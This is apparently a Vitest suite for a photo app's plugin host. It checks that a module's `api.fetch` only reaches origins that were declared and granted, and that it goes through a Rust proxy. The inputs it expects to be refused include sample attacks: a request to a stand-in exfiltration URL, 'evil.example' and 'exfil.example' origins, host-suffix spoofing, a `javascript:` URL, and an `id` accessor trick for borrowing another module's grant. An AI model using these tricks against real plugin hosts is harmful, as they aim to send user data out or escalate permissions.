/**
 * Host-mediated `api.fetch`, gated per module by declared and granted origins (#49).
 *
 * The three cases the acceptance criteria name are the first three describes: an undeclared
 * fetch is refused, a declared-and-granted one goes through Rust, and the CSP still blocks
 * the direct route. The rest are the ways this particular gate can be wrong:
 *
 *  - it lets a URL through whose origin was never declared (the whole feature);
 *  - it treats a grant for one origin as a grant for a sibling host, a different scheme, or
 *    a different port;
 *  - it keys on something a module supplies, so one module borrows another's grant — the
 *    same accessor attack #48 closed for `api.invoke`, which must hold here too;
 *  - it lets a module reach the network by going around `api.fetch` (global `fetch`);
 *  - a manifest and the module's own code disagree and the code wins;
 *  - a grant is grandfathered into existence for a capability that did not exist before.
 *
 * The Tauri boundary is mocked so a permitted call is observed *arriving* at `module_fetch`
 * with the exact arguments — "the promise resolved" would also be true of a gate that
 * swallowed it. `globalThis.fetch` is spied on throughout so "went through Rust" is asserted
 * rather than assumed.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import {
  __resetForTests,
  declaredOrigins,
  enableModule,
  grantedOrigins,
  grantPermissions,
  initHost,
  listModules,
  ModuleNetworkPermissionError,
  pendingOrigins,
  register,
  revokePermissions,
  setToastSink,
} from "../host";
import type { ChairPhotoAPI, ChairPhotoModule } from "../registry";

/** Every call that reaches the Tauri boundary. A refused fetch must leave this empty. */
const invoked: { command: string; args?: Record<string, unknown> }[] = [];
vi.mock("@tauri-apps/api/core", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@tauri-apps/api/core")>();
  return {
    ...actual,
    invoke: (command: string, args?: Record<string, unknown>) => {
      invoked.push({ command, args });
      return Promise.resolve({
        status: 200,
        statusText: "OK",
        ok: true,
        url: (args?.url as string) ?? "",
        headers: { "content-type": "application/json" },
        body: '{"stat":"ok"}',
      });
    },
  };
});

const settings = new Map<string, string>();
vi.mock("../api", async (importOriginal) => {
  const actual = await importOriginal<typeof import("../api")>();
  return {
    ...actual,
    listExternalModules: () => Promise.resolve([]),
    pluginFeatures: () => Promise.resolve(["module-fetch"]),
    appVersion: () => Promise.resolve("2026.8.0"),
    getSetting: (key: string) => Promise.resolve(settings.get(key) ?? null),
    setSetting: (key: string, value: string) => {
      settings.set(key, value);
      return Promise.resolve();
    },
  };
});

// ── Helpers ──────────────────────────────────────────────────────────────────

function makeModule(id: string, overrides: Partial<ChairPhotoModule> = {}): ChairPhotoModule {
  return {
    id,
    name: overrides.name ?? id,
    version: overrides.version ?? "1.0.0",
    permissions: overrides.permissions,
    onLoad: overrides.onLoad ?? (() => {}),
  };
}

/** Register + grant + enable, returning the injected API — the production sequence. */
function liveApi(mod: ChairPhotoModule): ChairPhotoAPI {
  let captured: ChairPhotoAPI | null = null;
  register({ ...mod, onLoad: (api) => (captured = api) });
  grantPermissions(mod.id, false);
  enableModule(mod.id, false);
  if (!captured) throw new Error(`${mod.id} was not enabled — onLoad never ran`);
  return captured;
}

const toasts: string[] = [];
/** Any route to the network that is NOT the proxy. Must stay at zero calls in every test. */
let directFetch: ReturnType<typeof vi.fn>;

beforeEach(() => {
  invoked.length = 0;
  toasts.length = 0;
  settings.clear();
  setToastSink((m) => toasts.push(m));
  directFetch = vi.fn(() => Promise.reject(new Error("blocked by CSP")));
  vi.stubGlobal("fetch", directFetch);
  vi.spyOn(console, "warn").mockImplementation(() => {});
  vi.spyOn(console, "error").mockImplementation(() => {});
});

afterEach(() => {
  // The one assertion every test shares: nothing here ever reached the network directly.
  expect(directFetch).not.toHaveBeenCalled();
  __resetForTests();
  setToastSink(() => {});
  vi.unstubAllGlobals();
  vi.restoreAllMocks();
});

// ── The three cases the acceptance criteria name ─────────────────────────────

describe("api.fetch — declared vs undeclared", () => {
  it("passes a declared, granted origin through to Rust with the request intact", async () => {
    const api = liveApi(
      makeModule("net-ok", { permissions: { origins: ["https://api.flickr.com"] } }),
    );

    const response = await api.fetch!("https://api.flickr.com/services/rest?method=x", {
      method: "POST",
      headers: { Authorization: "OAuth k" },
      body: '{"a":1}',
    });
    expect(response.status).toBe(200);
    expect(response.body).toBe('{"stat":"ok"}');

    // It went to the Rust proxy, with the origin the host approved alongside the URL — and
    // with no module id, because the backend must not be able to take identity from a caller.
    expect(invoked).toEqual([
      {
        command: "module_fetch",
        args: {
          url: "https://api.flickr.com/services/rest?method=x",
          origin: "https://api.flickr.com",
          method: "POST",
          headers: { Authorization: "OAuth k" },
          body: '{"a":1}',
        },
      },
    ]);
  });

  it("refuses an undeclared origin without anything reaching the backend", async () => {
    const api = liveApi(
      makeModule("net-one", { permissions: { origins: ["https://api.flickr.com"] } }),
    );

    await expect(api.fetch!("https://evil.example/collect?d=secrets")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
    expect(invoked).toEqual([]);
  });

  it("refuses everything from a module that declares no origins", async () => {
    // The shape of every manifest written before #49 — and the default for every module that
    // has no business on the network.
    const api = liveApi(
      makeModule("net-none", { permissions: { commands: ["get_photo"] } }),
    );

    await expect(api.fetch!("https://api.flickr.com/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
    expect(invoked).toEqual([]);
  });
});

describe("the direct route stays closed", () => {
  it("never touches global fetch, even for a permitted request", async () => {
    // `connect-src 'self' ipc: http://ipc.localhost` (#47, pinned by src-tauri/tests/csp.rs)
    // is what stops module code opening its own socket. This asserts the other half: the
    // capability added here does not quietly reintroduce one — a permitted `api.fetch` goes
    // over IPC, which is the only thing the CSP still allows.
    const api = liveApi(
      makeModule("net-ipc", { permissions: { origins: ["https://api.flickr.com"] } }),
    );

    await api.fetch!("https://api.flickr.com/");
    expect(invoked.map((i) => i.command)).toEqual(["module_fetch"]);
    // (afterEach asserts `directFetch` was never called, for this test and every other.)
  });

  it("does not hand the module anything it could call the network with itself", async () => {
    const api = liveApi(
      makeModule("net-surface", { permissions: { origins: ["https://api.flickr.com"] } }),
    );

    // The API object is the module's whole surface. Nothing on it is the global fetch, and
    // `api.fetch` is not it under another name — a module that got hold of the real one could
    // reach any CORS-permitting origin the CSP happened to allow.
    expect(api.fetch).not.toBe(globalThis.fetch);
    for (const value of Object.values(api as unknown as Record<string, unknown>)) {
      expect(value).not.toBe(globalThis.fetch);
    }
  });
});

// ── The grant is per origin, and an origin is scheme + host + port ───────────

describe("a grant covers one origin and no neighbours", () => {
  const flickr = () =>
    liveApi(makeModule("scoped", { permissions: { origins: ["https://api.flickr.com"] } }));

  it("does not extend to another host, however similar", async () => {
    const api = flickr();
    for (const url of [
      "https://api.flickr.com.evil.example/", // suffix trick
      "https://evil.example/?x=https://api.flickr.com", // the grant in a query string
      "https://up.flickr.com/", // a sibling subdomain: there are no wildcards
      "https://flickr.com/", // the parent domain
    ]) {
      await expect(api.fetch!(url)).rejects.toBeInstanceOf(ModuleNetworkPermissionError);
    }
    expect(invoked).toEqual([]);
  });

  it("does not extend to the same host over http", async () => {
    // The reason the unit is the origin rather than the host: same destination, transport
    // security removed, and everyone on the path receives what the user meant for Flickr.
    const api = flickr();
    await expect(api.fetch!("http://api.flickr.com/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
    expect(invoked).toEqual([]);
  });

  it("does not extend to the same host on another port", async () => {
    const api = flickr();
    await expect(api.fetch!("https://api.flickr.com:8443/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
    expect(invoked).toEqual([]);
  });

  it("covers every path on the granted origin, because paths are not the boundary", async () => {
    const api = flickr();
    await expect(api.fetch!("https://api.flickr.com/anything/at/all")).resolves.toBeTruthy();
    // …including the explicit default port, which normalises to the same origin.
    await expect(api.fetch!("https://api.flickr.com:443/x")).resolves.toBeTruthy();
    expect(invoked.map((i) => i.args?.origin)).toEqual([
      "https://api.flickr.com",
      "https://api.flickr.com",
    ]);
  });

  it("refuses a URL it cannot parse at all rather than passing it on", async () => {
    const api = flickr();
    for (const url of ["not a url", "", "//api.flickr.com/x", "javascript:alert(1)"]) {
      await expect(api.fetch!(url)).rejects.toBeInstanceOf(ModuleNetworkPermissionError);
    }
    expect(invoked).toEqual([]);
  });
});

// ── What a declaration may say ───────────────────────────────────────────────

describe("declared origins are normalised, and junk narrows", () => {
  it("normalises case, the default port and an IDN to one canonical origin", () => {
    register(
      makeModule("normalising", {
        permissions: {
          origins: [
            "https://API.Flickr.COM",
            "https://api.flickr.com:443/",
            "https://api.flickr.com",
          ],
        },
      }),
    );
    // Three spellings, one destination. Exact matching is only honest after normalising.
    expect(declaredOrigins("normalising")).toEqual(["https://api.flickr.com"]);
  });

  it("drops everything that is not a bare https origin", () => {
    register(
      makeModule("junk", {
        permissions: {
          origins: [
            "http://api.flickr.com", // cleartext
            // `new URL` parses these happily — `*` is not a forbidden host code point — so
            // dropping them takes a host-shape check, not just a successful parse. Left in
            // they would read as wildcard grants in the review dialog while granting nothing.
            "https://*.flickr.com",
            "https://*",
            "https://api.flickr.com.", // trailing dot: a different name that looks the same
            "*", // nor a catch-all
            "api.flickr.com", // not a URL
            "https://api.flickr.com/services", // a path is not enforced, so it is not accepted
            "https://api.flickr.com/?k=v",
            "https://api.flickr.com/#frag",
            "https://user:pw@api.flickr.com", // reads as one host, looks like another
            "ftp://api.flickr.com",
            "",
            "   ",
            "https://ok.example", // the one good entry, to prove the rest were dropped
          ],
        },
      }),
    );
    expect(declaredOrigins("junk")).toEqual(["https://ok.example"]);
  });

  it("snapshots the declaration, so mutating it after registration changes nothing", () => {
    const mod = makeModule("mutator", { permissions: { origins: ["https://a.example"] } });
    register(mod);
    mod.permissions!.origins!.push("https://evil.example");
    expect(declaredOrigins("mutator")).toEqual(["https://a.example"]);
  });
});

// ── Identity ─────────────────────────────────────────────────────────────────

describe("identity is the host's, not the caller's", () => {
  it("does not let one module reach an origin only another module declared", async () => {
    const publisher = liveApi(
      makeModule("publisher", { permissions: { origins: ["https://api.flickr.com"] } }),
    );
    const bystander = liveApi(
      makeModule("bystander", { permissions: { origins: ["https://tiles.example"] } }),
    );

    await expect(publisher.fetch!("https://api.flickr.com/")).resolves.toBeTruthy();
    await expect(bystander.fetch!("https://api.flickr.com/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
    expect(invoked).toHaveLength(1);
  });

  it("cannot be re-pointed by a module whose `id` is an accessor", async () => {
    // The #48 escalation, aimed at the network capability instead of at `api.invoke`. The
    // fetch gate must resolve identity from the same registration snapshot, or a module that
    // declared nothing borrows the grant of one that declared an origin.
    register(makeModule("victim", { permissions: { origins: ["https://api.flickr.com"] } }));
    grantPermissions("victim", false);

    let phase: "register" | "attack" = "register";
    let captured: ChairPhotoAPI | null = null;
    const shifty = {
      get id() {
        return phase === "register" ? "shifty" : "victim";
      },
      name: "Shifty",
      version: "1.0.0",
      permissions: { origins: [] },
      onLoad: (api: ChairPhotoAPI) => {
        captured = api;
      },
    } as unknown as ChairPhotoModule;

    register(shifty);
    grantPermissions("shifty", false);
    enableModule("shifty", false);
    expect(captured).not.toBeNull();

    phase = "attack";
    expect(shifty.id).toBe("victim");
    await expect(captured!.fetch!("https://api.flickr.com/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
    expect(invoked).toEqual([]);
  });
});

// ── The refusal is visible, to both audiences ────────────────────────────────

describe("a refusal is visible, not a silent no-op", () => {
  it("rejects with an error naming the module and the destination", async () => {
    const api = liveApi(
      makeModule("named", { permissions: { origins: ["https://a.example"] } }),
    );

    const error = await api.fetch!("https://b.example/x").then(
      () => null,
      (e: unknown) => e as ModuleNetworkPermissionError,
    );
    expect(error).toBeInstanceOf(ModuleNetworkPermissionError);
    expect(error?.moduleId).toBe("named");
    // The origin, not the full URL: the path is not what was refused.
    expect(error?.origin).toBe("https://b.example");
  });

  it("tells the USER once per destination, rather than only the module", async () => {
    const api = liveApi(
      makeModule("chatty", { name: "Chatty", permissions: { origins: [] } }),
    );

    await api.fetch!("https://b.example/1").catch(() => {});
    expect(toasts).toHaveLength(1);
    expect(toasts[0]).toContain("Chatty");
    expect(toasts[0]).toContain("https://b.example");

    // A retry loop must not bury the UI: same destination, different path, still one toast.
    await api.fetch!("https://b.example/2").catch(() => {});
    await api.fetch!("https://b.example/1").catch(() => {});
    expect(toasts).toHaveLength(1);

    // A different destination is a different fact.
    await api.fetch!("https://c.example/").catch(() => {});
    expect(toasts).toHaveLength(2);
  });

  it("logs every refusal, including the repeats it does not re-toast", async () => {
    const spy = vi.spyOn(console, "error").mockImplementation(() => {});
    const api = liveApi(makeModule("loud", { permissions: { origins: [] } }));

    await api.fetch!("https://z.example/").catch(() => {});
    await api.fetch!("https://z.example/").catch(() => {});
    expect(spy.mock.calls.filter((c) => String(c[0]).includes("z.example"))).toHaveLength(2);
  });
});

// ── Declaring is not granting ────────────────────────────────────────────────

describe("declaring an origin is not being granted it", () => {
  it("refuses to enable a module whose declared origins are ungranted", () => {
    const onLoad = vi.fn();
    register(makeModule("unreviewed", { permissions: { origins: ["https://a.example"] }, onLoad }));

    enableModule("unreviewed", false);

    expect(onLoad).not.toHaveBeenCalled();
    expect(listModules().find((m) => m.id === "unreviewed")?.enabled).toBe(false);
    expect(toasts.join(" ")).toContain("network destination");
  });

  it("refuses a declared origin whose grant was revoked", async () => {
    const api = liveApi(
      makeModule("revoked", { permissions: { origins: ["https://a.example"] } }),
    );
    await expect(api.fetch!("https://a.example/")).resolves.toBeTruthy();

    revokePermissions("revoked", false);

    // The API object the module already holds carries no cached answer.
    await expect(api.fetch!("https://a.example/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
  });

  it("reports declared and pending origins to the Modules panel", () => {
    register(
      makeModule("listed", {
        permissions: { origins: ["https://b.example", "https://a.example"] },
      }),
    );

    const before = listModules().find((m) => m.id === "listed")!;
    expect(before.origins).toEqual(["https://a.example", "https://b.example"]);
    expect(before.pendingOrigins).toEqual(["https://a.example", "https://b.example"]);
    // Not a blockedReason: the toggle is exactly what the user resolves this with.
    expect(before.blockedReason).toBeNull();

    grantPermissions("listed", false);
    const after = listModules().find((m) => m.id === "listed")!;
    expect(after.pendingOrigins).toEqual([]);
  });
});

// ── External modules: the manifest is authoritative ──────────────────────────

describe("external modules", () => {
  it("takes origins from the manifest and ignores the imported object's", async () => {
    let captured: ChairPhotoAPI | null = null;
    const sneaky = makeModule("sneaky", {
      // What the module's own code claims for itself…
      permissions: { origins: ["https://exfil.example"] },
      onLoad: (api) => (captured = api),
    });
    // …versus the manifest, which is what the host read without running it and what the user
    // reviewed.
    register(sneaky, { external: true, permissions: { origins: ["https://api.flickr.com"] } });

    expect(declaredOrigins("sneaky")).toEqual(["https://api.flickr.com"]);
    grantPermissions("sneaky", false);
    enableModule("sneaky", false);

    await expect(captured!.fetch!("https://api.flickr.com/")).resolves.toBeTruthy();
    await expect(captured!.fetch!("https://exfil.example/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
  });

  it("declares nothing when the manifest omits origins, whatever the code says", () => {
    register(makeModule("no-manifest-origins", { permissions: { origins: ["https://a.example"] } }), {
      external: true,
    });
    expect(declaredOrigins("no-manifest-origins")).toEqual([]);
  });
});

// ── Persistence and reload ───────────────────────────────────────────────────

describe("network grants persist, reload, and are never invented", () => {
  it("survives a restart, so the user is asked once", async () => {
    register(makeModule("persisted", { permissions: { origins: ["https://a.example"] } }));
    grantPermissions("persisted");
    enableModule("persisted");

    __resetForTests();
    const onLoad = vi.fn();
    await initHost([
      makeModule("persisted", { permissions: { origins: ["https://a.example"] }, onLoad }),
    ]);

    expect(onLoad).toHaveBeenCalledTimes(1);
    expect(grantedOrigins("persisted")).toEqual(["https://a.example"]);
  });

  it("re-asks when an updated module declares a destination it was never granted", async () => {
    settings.set("modules.enabled", "grower");
    settings.set(
      "modules.permissions",
      JSON.stringify({ grower: { commands: [], origins: ["https://a.example"] } }),
    );

    const onLoad = vi.fn();
    await initHost([
      makeModule("grower", {
        permissions: { origins: ["https://a.example", "https://b.example"] },
        onLoad,
      }),
    ]);

    expect(onLoad).not.toHaveBeenCalled();
    expect(pendingOrigins("grower")).toEqual(["https://b.example"]);
  });

  it("holds a module to what it still declares when the grant is wider", async () => {
    settings.set("modules.enabled", "shrinker");
    settings.set(
      "modules.permissions",
      JSON.stringify({
        shrinker: { commands: [], origins: ["https://a.example", "https://b.example"] },
      }),
    );

    let captured: ChairPhotoAPI | null = null;
    await initHost([
      makeModule("shrinker", {
        permissions: { origins: ["https://a.example"] },
        onLoad: (api) => (captured = api),
      }),
    ]);

    // granted ∩ declared: narrowing takes effect with no re-review.
    expect(grantedOrigins("shrinker")).toEqual(["https://a.example"]);
    await expect(captured!.fetch!("https://b.example/")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
  });

  it("reads a pre-#49 row as commands-only, never as a network grant", async () => {
    // The row shape #48 wrote. It cannot express an origin, and must not be read as granting
    // one — `api.fetch` did not exist when the user approved it.
    settings.set("modules.enabled", "old-row");
    settings.set("modules.permissions", JSON.stringify({ "old-row": ["a_cmd"] }));

    const onLoad = vi.fn();
    await initHost([
      makeModule("old-row", {
        permissions: { commands: ["a_cmd"], origins: ["https://a.example"] },
        onLoad,
      }),
    ]);

    expect(onLoad).not.toHaveBeenCalled();
    expect(pendingOrigins("old-row")).toEqual(["https://a.example"]);
  });

  it("does not grandfather a network grant for a module enabled before permissions existed", async () => {
    // No permissions row at all: a pre-#48 install. Its commands are grandfathered, because
    // before the gate it could invoke anything anyway. Its origins are NOT, because before
    // #49 it could reach nothing — granting them here would manufacture consent to send data
    // off the machine, which is the one thing the privacy invariant forbids.
    settings.set("modules.enabled", "legacy");

    const onLoad = vi.fn();
    await initHost([
      makeModule("legacy", {
        permissions: { commands: ["a_cmd"], origins: ["https://a.example"] },
        onLoad,
      }),
    ]);

    expect(onLoad).not.toHaveBeenCalled();
    expect(pendingOrigins("legacy")).toEqual(["https://a.example"]);
    expect(JSON.parse(settings.get("modules.permissions")!)).toEqual({
      legacy: { commands: ["a_cmd"], origins: [] },
    });
  });

  it("normalises a hand-edited grant row instead of trusting its spelling", async () => {
    // The settings table is a SQLite row a determined user can edit. A grant written in a
    // form the declaration path would have refused must not become live by that route.
    settings.set("modules.enabled", "handedited");
    settings.set(
      "modules.permissions",
      JSON.stringify({
        handedited: { commands: [], origins: ["HTTPS://A.EXAMPLE:443/", "http://b.example"] },
      }),
    );

    let captured: ChairPhotoAPI | null = null;
    await initHost([
      makeModule("handedited", {
        permissions: { origins: ["https://a.example"] },
        onLoad: (api) => (captured = api),
      }),
    ]);

    // The odd spelling of a genuinely declared origin normalises and works…
    expect(grantedOrigins("handedited")).toEqual(["https://a.example"]);
    await expect(captured!.fetch!("https://a.example/x")).resolves.toBeTruthy();
    // …and the cleartext entry buys nothing, because it was never declared either.
    await expect(captured!.fetch!("http://b.example/x")).rejects.toBeInstanceOf(
      ModuleNetworkPermissionError,
    );
  });

  it("fails closed on a corrupt permissions row", async () => {
    settings.set("modules.enabled", "corrupt");
    settings.set("modules.permissions", "{not json at all");

    const onLoad = vi.fn();
    await initHost([
      makeModule("corrupt", { permissions: { origins: ["https://a.example"] }, onLoad }),
    ]);

    expect(onLoad).not.toHaveBeenCalled();
    expect(pendingOrigins("corrupt")).toEqual(["https://a.example"]);
  });
});
